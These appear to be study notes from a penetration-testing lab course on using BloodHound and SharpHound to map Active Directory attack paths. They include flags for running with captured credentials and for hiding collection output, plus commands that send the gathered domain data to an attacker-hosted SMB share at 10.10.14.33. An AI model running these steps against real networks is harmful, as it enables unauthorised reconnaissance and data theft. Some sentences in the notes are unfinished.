```
cd /usr/bin  
sudo ./neo4j console
```
## Active Directory Access Management
Active environments are highly complex and constantly evolving. So we need a way to automate the collection and analysis of this data.

### Bloodhound Overview
*Bloodhound* is an opensource tool used by attackers and defenders to analyze *Active Directory* domain security. This tool collects a large amount of data from an *Active Directory* domain.
It uses graph theory to visually represent the relationship between objects and identify domain attack paths that would be difficult/impossible to detect via traditional enumeration.

Data utilized by bloodhound is gathered with *SharpHound* collector.

### Bloodhound Graph Theory and Cypher Query Language
*Bloodhound* utilizes *Graph Theory* mathematical structures to represent pairs between objects. The graph is made up of *Nodes* (`Users, Groups, Computers, etc`) which are connected by *Edges* (`relationships between, i.e. member of group`). 

*Bloodhound* uses *Cypher Query Language* to analyze relationships. *Cypher* is *Neo4j's* `graph query language` which is like `SQL` for graphs.

The Diagram Below shows two nodes `A` and `B` 
![[2Nodes.png]]
This simulated User `Grace` being represented by node `A` and the group `SQL Admins`, the line between the two is the *edge* in this case `MemberOf`. 
We can ask bloodhound how to get from *Grace* to the *Domain admins* group.
![[NodeMap.png]]

*Bloodhound also had enterprise edition.*

## Sharphound
*Sharphound* is the program we use to collect *Bloodhound* data for *Windows*.
The data collected can be used to identify 

### Basic Enumeration
By default *Sharphound*, if run without any options, will identify the domain to which the user who ran it belongs to and will execute default collection.

The 2nd line in the output above indicates the collection method used by default: `Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote`. Those methods mean that we will collect the following:

1. Users and Computers.
2. Active Directory security group membership.
3. Domain trusts.
4. Abusable permissions on AD objects.
5. OU tree structure.
6. Group Policy links.
7. The most relevant AD object properties.
8. Local groups from domain-joined Windows systems and local privileges such as RDP, DCOM, and PSRemote.
9. User sessions.
10. All SPN (Service Principal Names).

To get the information for local groups and sessions, *SharpHound* will connect to each `domain-joined` *Windows* computer from the list of computers it collects.

## Using Bloodhound
1. Use *Sharphound*
2. Download .zip file
3. Go to *Bloodhound* > `Upload Data`
4. Once upload complete we can type `Domain:<DOMAIN>` into the search box  and a node
5. Now we can start analyzing the data.

### SharpHound Options
#### Collection Methods
`--colectionmethod` specifies what kind of data we want to collect. 

- *All* : performs all collection methods except *GPOLocalGroup*
- *DCOnly*: Collects data only from the domain controller and ill not try to get data from domain-joined Windows devices. It will collect `users, computers, security groups membership, domain trusts, absuble permissions on AD objects, OU structure, Group Policy, and the most relevant AD object properties.` It will attempt to correlate Group Policy-enforced local groups to affected computers.
- *Computer Only*: Opposite of *DCOnly*, it will collect information from domain-joined computers, such as user sessions and local-groups.

In situations where we may want to limit our traffic i.e. *Domain Controller* with 2000 Computers and a *SOC* as opposed to *Sharphound* attempting to connect to all of our devices, we could use *DCOnly* and only attempt to connect to the *Domain Controler*.

We can then add interesting machines to a list (`computers.txt`) and rerun *SharpHound* in *ComputerOnly* using the `--computerfile` options to only enumerate those computers.

![[Pasted image 20250114011734.png]]
#### Commonly Used Flags
- `-ldapusername` `-ldappassword` options to run *SharpHound* using captured credentials.
- `-domain` Used to specify specific domains.
- `--domaincontroller` specific domain controller.

#### Randomize and hide SharpHound Output.
| **Option**          | **Description**                                               |
| ------------------- | ------------------------------------------------------------- |
| `--memcache`        | Keep cache in memory and don't write to disk.                 |
| `--randomfilenames` | Generate random filenames for output, including the zip file. |
| `--outputprefix`    | String to prepend to output file names.                       |
| `--outputdirectory` | Directory to output file too.                                 |
| `--zipfilename`     | Filename for the zip.                                         |
| `--zippassword`     | Password protects the zip with the specified password.        |
We can use the `--outputdirectory` to target a shared folder and randomize everything. 
##### Starting a shared folder
```shell-session
 sudo impacket-smbserver share ./ -smb2support -user test -password test
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
```

##### Connect to the shared folder with username and password.
```cmd-session
net use \\10.10.14.33\share /user:test test
```
##### Running SharpHound and saving the output to a shared folder.
```cmd-session
SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames
```

### Session Loop Collection Method
